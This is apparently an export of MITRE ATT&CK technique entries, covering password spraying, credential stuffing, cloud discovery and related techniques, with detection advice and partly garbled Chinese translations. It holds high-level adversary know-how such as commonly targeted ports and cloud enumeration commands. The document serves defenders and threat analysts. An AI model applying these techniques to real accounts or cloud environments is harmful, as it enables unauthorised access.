T1110.004,Brute Force: Credential Stuffing,"Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.

Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.

Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)",https://attack.mitre.org/techniques/T1110/004,11 February 2020,06 April 2021,1.2,Credential Access,"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.","Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, User Account: User Account Authentication",True,T1110,,Anastasios Pingios; Diogo Fernandes,User,,,CAPEC-600,,,"(Citation: NCC Group Chimera January 2021),(Citation: Bitdefender Trickbot March 2020),(Citation: ESET Trickbot Oct 2020),(Citation: NIST 800-63-3)",暴力破解：凭证填充,攻击者可能会使用从无关帐户的违规转储中获得的凭据，通过凭据重叠来访问目标帐户。有时，当网站或服务遭到破坏并且用户帐户凭据被访问时，大量用户名和密码对会在线转储。该信息可能对试图通过利用用户在个人和企业帐户中使用相同密码的趋势来破坏帐户的对手有用。凭据填充是一个有风险的选择，因为它可能导致大量身份验证失败和帐户锁定，具体取决于组织的登录失败策略。通常，在填充凭证时会使用常用端口上的管理服务。常见的目标服务包括： * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP/终端服务 (3389/TCP) * HTTP/HTTP 管理服务 (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306 /TCP) * VNC (5900/TCP) 除了管理服务外，攻击者还可以“针对使用联合身份验证协议的单点登录 (SSO) 和基于云的应用程序”以及面向外部的电子邮件应用程序，例如 Office 365 .（引用：US-CERT TA18-068A 2018）
T1110.002,Brute Force: Password Cracking,"Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) 

Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",https://attack.mitre.org/techniques/T1110/002,11 February 2020,19 April 2022,1.2,Credential Access,"It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. Consider focusing efforts on detecting other adversary behavior used to acquire credential materials, such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).","Azure AD, Linux, Network, Office 365, Windows, macOS","Application Log: Application Log Content, User Account: User Account Authentication",True,T1110,,Mohamed Kmal,,,,CAPEC-55,,,"(Citation: Cylance Cleaver),(Citation: FireEye FIN6 April 2016),(Citation: McAfee Night Dragon),(Citation: US-CERT TA18-074A),(Citation: APT3 Adversary Emulation Plan),(Citation: FireEye APT41 Aug 2019),(Citation: Kali Hydra),(Citation: NIST 800-63-3)",暴力破解：密码破解,当获得密码哈希等凭据材料时，攻击者可能会使用密码破解来尝试恢复可用凭据，例如明文密码。 [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) 可用于获取密码哈希，这可能只有在 [Pass the Hash](https://attack.mitre .org/techniques/T1550/002）不是一个选项。此外，攻击者可能会利用 [来自配置存储库的数据](https://attack.mitre.org/techniques/T1602) 来获取网络设备的散列凭证。（引用：US-CERT-TA18-106A）系统化的技术猜测用于计算哈希的密码是否可用，或者攻击者可能使用预先计算的彩虹表来破解哈希。破解哈希通常在目标网络之外的对手控制的系统上完成。（引用：维基百科密码破解）成功破解哈希产生的明文密码可用于登录帐户拥有的系统、资源和服务使用权。
T1110.001,Brute Force: Password Guessing,"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.

Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)
* SNMP (161/UDP and 162/TCP/UDP)

In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)

In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.",https://attack.mitre.org/techniques/T1110/001,11 February 2020,22 July 2022,1.3,Credential Access,"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.","Azure AD, Containers, Google Workspace, IaaS, Linux, Network, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, User Account: User Account Authentication",True,T1110,,Microsoft Threat Intelligence Center (MSTIC); Mohamed Kmal,,,,CAPEC-49,,,"(Citation: Microsoft STRONTIUM New Patterns Cred Harvesting Sept 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: Unit 42 Lucifer June 2020),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Trend Micro Xbash Sept 2018),(Citation: Unit42 Xbash Sept 2018),(Citation: Malwarebytes Pony April 2016),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: ANSSI Sandworm January 2021),(Citation: Malwarebytes Emotet Dec 2017),(Citation: US-CERT Emotet Jul 2018),(Citation: CIS Emotet Dec 2018),(Citation: Secureworks Emotet Nov 2018),(Citation: Symantec Emotet Jul 2018),(Citation: FireEye Periscope March 2018),(Citation: CME Github September 2018),(Citation: NIST 800-63-3)",暴力破解：密码猜测,"事先不知道系统或环境中的合法凭证的攻击者可能会猜测密码以尝试访问帐户。在不知道帐户密码的情况下，攻击者可能会选择使用重复或迭代机制系统地猜测密码。攻击者可能会在操作期间通过使用常用密码列表来猜测登录凭据，而无需事先了解系统或环境密码。密码猜测可能会也可能不会考虑目标对密码复杂性的策略，或者使用可能会在多次尝试失败后锁定帐户的策略。猜测密码可能是一个有风险的选择，因为它可能导致大量身份验证失败和帐户锁定，具体取决于组织的登录失败策略。 （引用：Cylance Cleaver）通常，在猜测密码时会使用常用端口上的管理服务。常见的目标服务包括： * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP/终端服务 (3389/TCP) * HTTP/HTTP 管理服务 (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306 /TCP) * VNC (5900/TCP) * SNMP（161/UDP 和 162/TCP/UDP） 除了管理服务外，攻击者还可以“针对使用联合身份验证协议的单点登录 (SSO) 和基于云的应用程序， ""以及面向外部的电子邮件应用程序，例如 Office 365。（引用：US-CERT TA18-068A 2018）。此外，攻击者可能会滥用网络设备接口（例如“wlanAPI”）通过无线身份验证协议暴力破解可访问的 wifi 路由器。（引用：Trend Micro Emotet 2020）在默认环境中，LDAP 和 Kerberos 连接尝试的可能性较小通过 SMB 触发事件，这会创建 Windows“登录失败”事件 ID 4625。"
T1110.003,Brute Force: Password Spraying,"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)

In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.",https://attack.mitre.org/techniques/T1110/003,11 February 2020,06 April 2021,1.2,Credential Access,"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.

Consider the following event IDs:(Citation: Trimarc Detecting Password Spraying)

* Domain Controllers: ""Audit Logon"" (Success & Failure) for event ID 4625.
* Domain Controllers: ""Audit Kerberos Authentication Service"" (Success & Failure) for event ID 4771.
* All systems: ""Audit Logon"" (Success & Failure) for event ID 4648.","Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, User Account: User Account Authentication",True,T1110,,John Strand; Microsoft Threat Intelligence Center (MSTIC),User,,,CAPEC-565,,,"(Citation: Microsoft STRONTIUM New Patterns Cred Harvesting Sept 2020),(Citation: GitHub MailSniper),(Citation: NCC Group Chimera January 2021),(Citation: MSRC Nobelium June 2021),(Citation: MSTIC Nobelium Oct 2021),(Citation: Novetta Blockbuster RATs),(Citation: SecureWorks August 2019),(Citation: Microsoft Targeting Elections September 2020),(Citation: Symantec Leafminer July 2018),(Citation: Microsoft Holmium June 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Anomali Linux Rabbit 2018),(Citation: FireEye APT33 Guardrail),(Citation: Novetta Blockbuster),(Citation: CME Github September 2018),(Citation: Secure List Bad Rabbit),(Citation: DOJ Iran Indictments March 2018),(Citation: Dragos Crashoverride 2018),(Citation: NIST 800-63-3)",暴力破解：密码喷洒,攻击者可能会针对许多不同的帐户使用单个或一小部分常用密码，以尝试获取有效的帐户凭据。密码喷射使用一个密码（例如“Password01”），或一小部分常用密码，可能与域的复杂性策略相匹配。尝试使用该密码对网络上的许多不同帐户进行登录，以避免在暴力破解具有多个密码的单个帐户时通常会发生的帐户锁定。 （引用：BlackHillsInfosec 密码喷射） 通常，在密码喷射时使用常用端口上的管理服务。常见的目标服务包括： * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP/终端服务 (3389/TCP) * HTTP/HTTP 管理服务 (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306 /TCP) * VNC (5900/TCP) 除了管理服务外，攻击者还可以“针对使用联合身份验证协议的单点登录 (SSO) 和基于云的应用程序”以及面向外部的电子邮件应用程序，例如 Office 365 .（引用：US-CERT TA18-068A 2018）在默认环境中，LDAP 和 Kerberos 连接尝试不太可能触发 SMB 上的事件，这会创建 Windows“登录失败”事件 ID 4625。
T1612,Build Image on Host,"Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image)

An adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. ",https://attack.mitre.org/techniques/T1612,30 March 2021,01 April 2022,1.2,Defense Evasion,Monitor for unexpected Docker image build requests to the Docker daemon on hosts in the environment. Additionally monitor for subsequent network communication with anomalous IPs that have never been seen before in the environment that indicate the download of malicious code.,Containers,"Image: Image Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,"Assaf Morag, @MoragAssaf, Team Nautilus Aqua Security; Michael Katchinskiy, @michael64194968, Team Nautilus Aqua Security; Roi Kol, @roykol1, Team Nautilus Aqua Security; Vishwas Manral, McAfee","root, User",,,,,,",(Citation: Docker Daemon Socket Protect),(Citation: Kubernetes Hardening Guide)",在主机上构建映像/镜像,攻击者可能会直接在主机上构建容器镜像，以绕过监控从公共注册表检索恶意镜像的防御措施。远程 <code>build</code> 请求可以发送到 Docker API，该 API 包含一个 Dockerfile，该文件从公共或本地注册表中拉取 vanilla 基础镜像，例如 alpine，然后在其上构建自定义镜像。（引文: Docker Build Image) 攻击者可以利用 <code>build</code> API 在主机上构建自定义镜像，其中包含从其 C2 服务器下载的恶意软件，然后他们可以利用 [Deploy Container](https ://attack.mitre.org/techniques/T1610）使用该自定义映像。（引文：Aqua Build Images on Hosts）（引文：Aqua Security Cloud Native Threat Report June 2021）如果从公共注册表中提取基础图像，防御系统可能不会将图像检测为恶意图像，因为它是普通图像。如果基础镜像已经驻留在本地注册表中，则可以认为拉取更不可疑，因为该镜像已经在环境中。
T1115,Clipboard Data,"Adversaries may collect data stored in the clipboard from users copying information within or between applications. 

In Windows, Applications can access clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)",https://attack.mitre.org/techniques/T1115,31 May 2017,23 April 2020,1.1,Collection,"Access to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution",False,,,,,,,CAPEC-637,,,"(Citation: Symantec Chafer Dec 2015),(Citation: Kaspersky Adwind Feb 2016),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: IBM Grandoreiro April 2020),(Citation: F-Secure Cosmicduke),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Github PowerShell Empire),(Citation: FoxIT Wocao December 2019),(Citation: Securelist Remexi Jan 2019),(Citation: Unit42 Redaman January 2019),(Citation: ESET RTM Feb 2017),(Citation: objsee mac malware 2017),(Citation: ESET Machete July 2019),(Citation: Unit 42 Playbook Dec 2017),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: McAfee Gold Dragon),(Citation: Palo Alto OilRig May 2016),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Malwarebytes DarkComet March 2018),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Cybereason Astaroth Feb 2019),(Citation: ESET Casbaneiro Oct 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Github Koadic),(Citation: FireEye APT38 Oct 2018),(Citation: Korean FSI TA505 2020),(Citation: Talos Agent Tesla Oct 2018),(Citation: Securelist Machete Aug 2014),(Citation: Trend Micro DRBControl February 2020),(Citation: ESET Attor Oct 2019),(Citation: Symantec Chafer February 2018),(Citation: Talent-Jump Clambling February 2020),(Citation: Talos Konni May 2017),(Citation: Kaspersky TajMahal April 2019),(Citation: Symantec Catchamas April 2018),(Citation: Fortinet Agent Tesla April 2018),(Citation: Riskiq Remcos Jan 2018),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Cylance Cleaver),(Citation: Fortinet Agent Tesla June 2017),",剪贴板数据,攻击者可能会从在应用程序内或应用程序之间复制信息的用户那里收集存储在剪贴板中的数据。在 Windows 中，应用程序可以使用 Windows API 访问剪贴板数据。（引用：MSDN 剪贴板）OSX 提供了一个本地命令，<code>pbpaste</code>，以获取剪贴板内容。（引用：使用 EmPyre 操作）
T1580,Cloud Infrastructure Discovery,"An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.

Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket’s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)

An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.",https://attack.mitre.org/techniques/T1580,20 August 2020,20 April 2022,1.3,Discovery,"Establish centralized logging for the activity of cloud infrastructure components. Monitor logs for actions that could be taken to gather information about cloud infrastructure, including the use of discovery API calls by new or unexpected users and enumerations from unknown or malicious IP addresses. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",IaaS,"Cloud Storage: Cloud Storage Enumeration, Cloud Storage: Cloud Storage Metadata, Instance: Instance Enumeration, Instance: Instance Metadata, Snapshot: Snapshot Enumeration, Snapshot: Snapshot Metadata, Volume: Volume Enumeration, Volume: Volume Metadata",False,,,"Isif Ibrahima, Mandiant; Praetorian; Regina Elwell",,,,,,,",",云基础设施发现,攻击者可能会尝试发现基础设施即服务 (IaaS) 环境中可用的基础设施和资源。这包括计算服务资源，例如实例、虚拟机和快照，以及其他服务的资源，包括存储和数据库服务。云提供商提供 API 和通过 CLI 发出的命令等方法来提供有关基础设施的信息。例如，AWS 在 Amazon EC2 API 中提供了一个 <code>DescribeInstances</code> API，它可以返回关于一个账户中一个或多个实例的信息，<code>ListBuckets</code> API 返回所有存储桶的列表由经过身份验证的请求发送者拥有，<code>HeadBucket</code> API 用于确定存储桶的存在以及请求发送者的访问权限，或 <code>GetPublicAccessBlock</code> API 用于检索访问块配置(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) 同样，GCP 的 Cloud SDK CLI 提供 <code>gcloud 计算实例列表< /code> 命令列出项目中的所有 Google Compute Engine 实例（引用：Google Compute Instances），Azure 的 CLI 命令 <code>az vm list</code> 列出虚拟机的详细信息。（引用：Microsoft AZ CLI）在除了 API 命令，攻击者还可以利用 open通过 [Wordlist Scanning] (https://attack.mitre.org/techniques/T1595/003) 发现云存储基础设施的源工具。确定该用户可用的密钥。（引文：在 AWS 中驱逐 IO Evil）这些可用资源的发现可能有助于攻击者确定他们在云环境中的下一步，例如建立持久性。（引文：Mandiant M-Trends 2020 ）攻击者还可以使用此信息更改配置以使存储桶可公开访问，从而无需身份验证即可访问数据。攻击者也可能使用基础设施发现 API，例如 <code>DescribeDBInstances</code> 来确定数据库资源的大小、所有者、权限和网络 ACL。 （引用：AWS 描述数据库实例）攻击者可以使用此信息来确定数据库的潜在价值并发现访问它们的要求。与 [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526) 不同，该技术侧重于发现所提供服务的组件，而不是服务本身。
T1538,Cloud Service Dashboard,"An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)

Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",https://attack.mitre.org/techniques/T1538,30 August 2019,16 March 2021,1.1,Discovery,"Monitor account activity logs to see actions performed and activity associated with the cloud service management console. Some cloud providers, such as AWS, provide distinct log events for login attempts to the management console.(Citation: AWS Console Sign-in Events)","Azure AD, Google Workspace, IaaS, Office 365","Logon Session: Logon Session Creation, User Account: User Account Authentication",False,,,Praetorian,User,,,,,,",",云服务仪表板/云服务看板,攻击者可能使用带有被盗凭证的云服务仪表板 GUI 从可操作的云环境中获取有用信息，例如特定服务、资源和功能。例如，GCP 指挥中心可用于查看所有资产、潜在安全风险的发现以及运行其他查询，例如查找公共 IP 地址和开放端口。（引用：Google Command Center Dashboard）取决于配置在这种环境下，攻击者可能能够通过图形仪表板枚举比 API 更多的信息。这允许攻击者在不发出任何 API 请求的情况下获取信息。
T1526,Cloud Service Discovery,"An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. 

Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)

Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)",https://attack.mitre.org/techniques/T1526,30 August 2019,16 March 2021,1.2,Discovery,"Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Normal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment.","Azure AD, Google Workspace, IaaS, Office 365, SaaS","Cloud Service: Cloud Service Enumeration, Cloud Service: Cloud Service Metadata",False,,,Praetorian; Suzy Schapperle - Microsoft Azure Red Team,User,,,,,,"(Citation: Roadtools),(Citation: AADInternals Documentation),",云服务发现,攻击者可能会在获得访问权限后尝试枚举系统上运行的云服务。这些方法可能不同于平台即服务 (PaaS)、基础架构即服务 (IaaS) 或软件即服务 (SaaS)。许多服务存在于各种云提供商中，可以包括持续集成和持续交付 (CI/CD)、Lambda 函数、Azure AD 等。攻击者可能会尝试发现有关在整个环境中启用的服务的信息。 Azure 工具和 API，例如 Azure AD Graph API 和 Azure Resource Manager API，可以枚举资源和服务，包括应用程序、管理组、资源和策略定义，以及它们可以通过身份访问的关系。（引用：Azure - Resource Manager API）（引用：Azure AD Graph API） Stormspotter 是一个开源工具，用于枚举和构建 Azure 资源和服务的图形，Pacu 是一个开源 AWS 开发框架，支持多种发现云服务的方法。（引用: Azure - Stormspotter)(引用: GitHub Pacu)
T1619,Cloud Storage Object Discovery,"Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure.

Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS (Citation: ListObjectsV2) and List Blobs in Azure(Citation: List Blobs) .",https://attack.mitre.org/techniques/T1619,01 October 2021,11 April 2022,1.0,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained. 
Monitor cloud logs for API calls used for file or object enumeration for unusual activity. ",IaaS,"Cloud Storage: Cloud Storage Access, Cloud Storage: Cloud Storage Enumeration",False,,,"Isif Ibrahima, Mandiant; Regina Elwell",,,,,,,"(Citation: Peirates GitHub),",云存储对象发现,攻击者可能会枚举云存储基础设施中的对象。攻击者可能会在自动发现期间使用此信息来塑造后续行为，包括从云存储请求所有或特定对象。类似于本地主机上的【文件和目录发现】（https://attack.mitre.org/techniques/T1083），在识别出可用的存储服务（即【云基础设施发现】（https://attack.mitre.org） /techniques/T1580)) 攻击者可以访问存储在云基础设施中的内容/对象。云服务提供商提供 API，允许用户枚举存储在云存储中的对象。示例包括 AWS 中的 ListObjectsV2 (Citation: ListObjectsV2) 和 Azure 中的 List Blob(Citation: List Blobs)。
T1059,Command and Scripting Interpreter,"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).

Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)",https://attack.mitre.org/techniques/T1059,31 May 2017,19 April 2022,2.3,Execution,"Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.

If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.","Linux, Network, Windows, macOS","Command: Command Execution, Module: Module Load, Process: Process Creation, Process: Process Metadata, Script: Script Execution",False,,,,,1.0,,,,,"(Citation: Unit 42 QUADAGENT July 2018),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: FireEye FIN6 Apr 2019),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Github PowerShell Empire),(Citation: FireEye APT39 Jan 2019),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Nccgroup Gh0st April 2018),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: FBI FLASH APT39 September 2020),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Symantec Whitefly March 2019),(Citation: FireEye Hacking Team),(Citation: ClearSky Wilted Tulip July 2017),(Citation: FireEye FiveHands April 2021),(Citation: ESET Sednit Part 2),(Citation: FireEye APT19),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Malwarebytes DarkComet March 2018),(Citation: Donut 